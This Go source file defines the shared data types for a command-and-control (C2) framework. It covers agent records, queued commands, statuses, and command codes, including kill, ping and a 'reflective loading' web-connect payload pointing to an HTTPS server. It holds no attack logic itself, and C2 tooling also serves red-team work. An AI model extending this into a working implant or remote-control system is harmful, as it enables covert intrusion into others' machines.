// Package common contains shared code for both server and agent_env
package common

import "time"

// Agent represents a connected agent_env
type Agent struct {
	ID              string    `json:"id"`
	IP              string    `json:"ip"`
	OS              string    `json:"os"`
	Service         string    `json:"service"`
	Status          string    `json:"status"`
	LastSeen        time.Time `json:"last_seen"`
	FirstSeen       time.Time `json:"first_seen"`
	NetworkAdapter  string    `json:"network_adapter"`
	CommandResponse string    `json:"command_response"` // Holds the latest command response
}

// Command represents a command sent to an agent_env
type Command struct {
	ID        string    `json:"id"`
	AgentID   string    `json:"agent_id"`
	Content   string    `json:"content"`
	Timestamp time.Time `json:"timestamp"`
	Status    string    `json:"status"`
	Output    string    `json:"output"`
}

// CommandStatus represents the status of a command
const (
	CommandStatusSent     = "SENT"
	CommandStatusReceived = "RECEIVED"
	CommandStatusExecuted = "EXECUTED"
	CommandStatusFailed   = "FAILED"
)

// AgentStatus represents the status of an agent_env
const (
	AgentStatusAlive   = "ALIVE"
	AgentStatusMissing = "MIA"
	AgentStatusKilled  = "SRV-KILLED"
)

// CommandType represents the type of C2 command
const (
	CommandContinued  = "COMU" // Command unfinished
	CommandDone       = "COMD" // Command finished
	CommandKill       = "KILL" // Kill command
	CommandPing       = "PING" // Ping command
	CommandOutput     = "COMO" // Command output
	CommandWebConnect = "WCON" // Web connection for reflective loading
)

// WebConnectPayload represents the data needed for reflective loading
type WebConnectPayload struct {
	ServerURL string `json:"server_url"` // URL of the HTTPS server to connect to
}
